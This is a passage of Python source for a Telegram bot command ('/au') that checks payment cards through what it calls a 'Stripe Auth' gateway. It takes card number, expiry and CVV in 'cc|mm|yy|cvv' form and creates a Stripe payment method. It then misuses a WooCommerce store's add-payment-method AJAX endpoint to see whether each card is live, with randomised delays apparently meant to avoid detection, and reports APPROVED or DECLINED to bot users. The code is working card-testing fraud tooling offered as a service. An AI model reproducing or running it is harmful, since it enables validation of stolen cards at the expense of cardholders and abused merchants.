            logger.stripe("Sending request to Stripe API...")
            await asyncio.sleep(random.uniform(0.5, 1.5))

            stripe_response = await client.post("https://api.stripe.com/v1/payment_methods", 
                                               headers=stripe_headers, data=stripe_data)

            logger.debug_response(f"Stripe API Response: {stripe_response.status_code}")

            if stripe_response.status_code != 200:
                error_text = stripe_response.text[:150] if stripe_response.text else "No response"
                logger.error(f"Stripe API error: {error_text}")
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Stripe Error: {error_text}", username, time.time()-start_time, user_data, bin_info)

            stripe_json = stripe_response.json()
            logger.debug_response(f"Stripe Response: {stripe_response.status_code} - {json.dumps(stripe_json, indent=2)[:300]}...")

            if "error" in stripe_json:
                error_msg = stripe_json["error"].get("message", "Stripe declined")
                logger.error(f"Stripe error message: {error_msg}")
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)

            payment_method_id = stripe_json.get("id")
            if not payment_method_id:
                logger.error("No payment method ID in Stripe response")
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", username, time.time()-start_time, user_data, bin_info)

            logger.success(f"Payment method created: {payment_method_id}")

            # Confirm setup intent with website
            logger.step(5, 6, "Confirming setup intent...")
            ajax_url = f"{self.base_url}/wp-admin/admin-ajax.php"
            ajax_headers = self.get_base_headers()
            ajax_headers.update({
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/my-account-2/add-payment-method/",
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            })

            ajax_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce
            }

            await asyncio.sleep(random.uniform(0.3, 0.8))

            ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
            logger.debug_response(f"AJAX Response: {ajax_response.status_code}")

            await client.aclose()

            if ajax_response.status_code != 200:
                error_detail = "Bad Request"
                try:
                    error_json = ajax_response.json()
                    if isinstance(error_json, dict):
                        if 'data' in error_json and 'message' in error_json['data']:
                            error_detail = error_json['data']['message']
                except:
                    pass

                logger.error(f"AJAX error: {error_detail}")
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", username, time.time()-start_time, user_data, bin_info)

            try:
                result = ajax_response.json()
                logger.debug_response(f"AJAX Response: {json.dumps(result, indent=2)}")

                logger.step(6, 6, "Analyzing result...")

                if result.get("success"):
                    logger.success("Card APPROVED")

                    if (isinstance(result.get("data"), dict) and 
                        result["data"].get("status") == "requires_action" and
                        result["data"].get("next_action", {}).get("type") == "use_stripe_sdk" and
                        "three_d_secure_2_source" in result["data"].get("next_action", {}).get("use_stripe_sdk", {})):

                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**", username, time.time()-start_time, user_data, bin_info)

                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successful", username, time.time()-start_time, user_data, bin_info)
                else:
                    error_data = result.get("data", {})
                    error_message = "Transaction Declined"

                    if isinstance(error_data, dict):
                        if "error" in error_data:
                            error_obj = error_data["error"]
                            if isinstance(error_obj, dict):
                                error_message = error_obj.get("message", "Card Declined")
                            else:
                                error_message = str(error_obj)
                        elif "message" in error_data:
                            error_message = error_data["message"]
                    elif isinstance(error_data, str):
                        error_message = error_data

                    logger.warning(f"Card DECLINED: {error_message}")
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time, user_data, bin_info)

            except json.JSONDecodeError as e:
                logger.error(f"JSON decode error: {str(e)}")
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Invalid server response", username, time.time()-start_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            if client:
                await client.aclose()
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
        except httpx.ConnectError:
            logger.error("Connection error")
            if client:
                await client.aclose()
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            if client:
                await client.aclose()
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)

# Command handler
@Client.on_message(filters.command(["au", ".au", "$au"]))
@auth_and_free_restricted
async def handle_stripe_auth(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled (BEFORE any other checks)
        # Import the function from Admins module
        from BOT.helper.Admins import is_command_disabled, get_command_offline_message

        # Get the actual command that was used
        command_text = message.text.split()[0]  # Get /au or .au or $au
        command_name = command_text.lstrip('/.$')  # Extract just 'au'

        # Check if command is disabled
        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "au")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        # NO CREDIT DEDUCTION FOR ANY USER - This gate is FREE
        # REMOVED: update_user_credits(user_id) call completely

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ─[STRIPE AUTH]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/au</code> or <code>.au</code> or <code>$au</code>
⟐ <b>Usage</b>: <code>/au cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/au 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Checks card via Stripe Auth gateway</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        checker = StripeAuthChecker()
        processing_msg = await message.reply(
            checker.get_processing_message(cc, mes, ano, cvv, username, plan_name)
        )

        result = await checker.check_card(card_details, username, user_data)

        await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")